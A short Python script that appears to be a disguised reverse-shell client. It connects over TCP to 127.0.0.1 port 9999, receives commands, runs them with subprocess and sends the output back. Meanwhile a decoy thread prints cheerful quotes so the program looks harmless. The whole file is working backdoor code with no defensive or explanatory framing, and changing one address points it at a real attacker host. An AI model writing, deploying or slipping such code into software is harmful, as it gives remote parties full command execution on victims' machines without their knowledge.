import socket 
import subprocess
import os
import time
import threading
from quote import quote

starttime = time.time()
def random_quotes():
	res = quote('happy',limit=1)
	print(res[0]['quote'])
	time.sleep(60.0 - ((time.time() - starttime) % 60.0))

def shell(c):
    while True:
        cmd = c.recv(2024).decode()
        if "cd" in cmd: 
            try: 
                os.chdir(cmd[3:])
                output = subprocess.getoutput("pwd")
                message = f"{output}"  
                c.send(message.encode()) 
            except FileNotFoundError as e: 
                output = str(e) 
            else: 
                output = ""
        else:
            output = subprocess.getoutput(cmd)
            message = f"{output}"  
            c.send(message.encode())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(("127.0.0.1", 9999))
t1 = threading.Thread(target=shell, args=[sock])
t2 = threading.Thread(target=random_quotes)
t1.start()
t2.start()
